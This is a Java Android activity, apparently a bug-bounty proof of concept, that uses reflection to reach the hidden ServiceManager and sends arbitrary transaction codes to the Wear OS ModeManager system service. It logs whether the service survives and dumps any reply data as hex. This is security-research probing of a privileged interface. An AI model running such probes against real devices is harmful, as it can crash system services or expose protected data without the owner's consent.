package com.vrp.poc;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;
import java.lang.reflect.Method;

public class ModeManagerPinpointActivity extends Activity {
    private static final String TAG = "VRP_PINPOINT";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        final TextView tv = new TextView(this);
        tv.setPadding(16, 16, 16, 16);
        tv.setTextSize(8f);
        sv.addView(tv);
        setContentView(sv);

        int targetTxn = getIntent().getIntExtra("txn", 1);

        new Thread(() -> {
            StringBuilder sb = new StringBuilder();
            sb.append("=== ModeManager Pinpoint Test ===\n");
            sb.append("UID: ").append(android.os.Process.myUid()).append("\n");
            sb.append("Target transaction: ").append(targetTxn).append("\n\n");
            Log.i(TAG, "START: UID=" + android.os.Process.myUid() + " txn=" + targetTxn);

            try {
                Class<?> smClass = Class.forName("android.os.ServiceManager");
                Method getService = smClass.getMethod("getService", String.class);
                IBinder modeBinder = (IBinder) getService.invoke(null, "ModeManager");

                if (modeBinder == null) {
                    sb.append("ModeManager NOT found\n");
                    Log.e(TAG, "ModeManager not found");
                    final String r = sb.toString();
                    runOnUiThread(() -> tv.setText(r));
                    return;
                }

                sb.append("ModeManager found\n");
                String iface = modeBinder.getInterfaceDescriptor();
                sb.append("Interface: ").append(iface).append("\n");
                Log.i(TAG, "ModeManager found: " + iface);

                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken("com.android.clockwork.modes.IModeManager");
                    Log.i(TAG, "SENDING txn " + targetTxn + "...");
                    boolean r = modeBinder.transact(targetTxn, data, reply, 0);
                    Log.i(TAG, "RESULT txn " + targetTxn + ": transact=" + r);
                    reply.setDataPosition(0);
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        sb.append("Txn ").append(targetTxn).append(": OK, avail=").append(avail).append("\n");
                        Log.i(TAG, "Txn " + targetTxn + ": OK, avail=" + avail);
                        if (avail > 0 && avail < 1024) {
                            byte[] raw = new byte[avail];
                            reply.readByteArray(raw);
                            StringBuilder hex = new StringBuilder();
                            for (byte b : raw) hex.append(String.format("%02x", b));
                            sb.append("Data: ").append(hex).append("\n");
                            Log.i(TAG, "Data: " + hex);
                        }
                    } catch (Exception ex) {
                        sb.append("Txn ").append(targetTxn).append(": ").append(ex.getClass().getSimpleName())
                          .append(" ").append(ex.getMessage()).append("\n");
                        Log.i(TAG, "Txn " + targetTxn + ": " + ex.getMessage());
                    }
                } finally {
                    data.recycle();
                    reply.recycle();
                }

                sb.append("\nSURVIVED - no crash\n");
                Log.i(TAG, "SURVIVED txn " + targetTxn);

            } catch (Exception e) {
                sb.append("ERROR: ").append(e.getMessage()).append("\n");
                Log.e(TAG, "Error", e);
            }

            final String result = sb.toString();
            runOnUiThread(() -> tv.setText(result));
        }).start();
    }
}
